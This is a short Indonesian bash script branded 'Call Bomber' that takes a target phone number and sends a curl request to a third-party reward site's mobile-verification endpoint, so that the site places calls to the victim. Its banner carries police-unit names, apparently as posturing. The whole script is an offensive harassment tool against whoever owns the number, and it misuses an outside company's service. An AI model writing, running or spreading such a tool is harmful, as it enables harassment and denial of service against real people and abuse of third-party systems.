#!bin/bash
clear

echo "{+}===================={+}"
echo "    Author: Danendra DIVPOLRI    "
echo "    Tools : Call Bomber   "
echo "{+}===================={+}"
figlet CallBomber  | lolcat
echo '
[1] Call
[2] Exit Tools
     '

echo
read -p "masukan nomornya : " pil
if [[ $pil == 1 ]]; then
read -p "masukan no target [Ex 8xxxxxxxxx] : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo 'MABES POLRI - DIVIT TRUNOJO 3498349'
exit
fi
echo
